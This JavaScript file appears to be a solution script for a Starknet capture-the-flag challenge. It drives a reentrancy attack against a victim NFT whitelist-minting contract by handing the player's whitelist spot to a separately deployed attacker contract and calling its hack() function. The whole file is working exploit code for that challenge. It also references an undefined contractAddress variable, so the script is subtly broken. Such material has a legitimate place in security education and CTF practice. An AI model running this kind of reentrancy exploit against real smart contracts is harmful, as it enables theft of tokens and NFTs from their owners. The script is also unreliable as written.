// @DEV: You need to run `./deploy/reentrancy-contract.js` first before running this script
import { Provider, constants, ec, Account, Contract } from "starknet";
import reentrancyCompiled from "./public/abis/reentrancyCompiled.js";
import victimABI from "./public/abis/victimABI";

// UPDATE THOSE LINES
const uuid = "<<UUID_OF_THE_INSTANCE>>";
const baseUrl = "<<ENDPOINT_OF_THE_INSTANCE>>";
const player = "<<ADDRESS_OF_THE_PLAYER>>";
const privateKey = "<<PRIVATE_KEY_OF_THE_PLAYER>>";

// This is the address of the contract you deployed by running `./deploy/reentrancy-contract.js`
const reentrancyAddress = "<<ADDRESS_OF_THE_REENTRANCY_CONTRACT>>";
// This is the address of the NFT contract. It's the NFT contrat with which the victim contract is interacting
const punkContractAddress = "<<ADDRESS_OF_THE_PUNK_NFT_CONTRACT>>";

const provider = new Provider({
  sequencer: {
    baseUrl: `${baseUrl}`,
    chainId: constants.StarknetChainId.TESTNET,
    feederGatewayUrl: `${baseUrl}/feeder_gateway`,
    gatewayUrl: `${baseUrl}/gateway`,
    headers: {
      Authorization: `Basic ${Buffer.from(uuid + ":").toString("base64")}`,
    },
  },
});

const getAccount = () => {
  const starkKeyPair = ec.getKeyPair(privateKey);
  const account = new Account(provider, player, starkKeyPair);
  return account;
};

const getContract = (account) => {
  const contract = new Contract(victimABI, contractAddress, account);
  return contract;
};

const getReetrancyContract = (account) => {
  const reeFactory = new Contract(
    reentrancyCompiled.abi,
    reentrancyAddress,
    account
  );
  return reeFactory;
};

async function main() {
  try {
    const account = getAccount();
    const contract = getContract(account);
    const reentrancyContract = getReetrancyContract(account);

    // Transfer the whitelist spot of the player to the Reetrancy contract
    await contract.transferWhitelistSpot(reentrancyAddress);

    // Then run the reetrancy attack
    await reentrancyContract.hack(
      contract.address,
      account.address,
      punkContractAddress
    );
  } catch (e) {
    console.error(e);
  }
}

main();
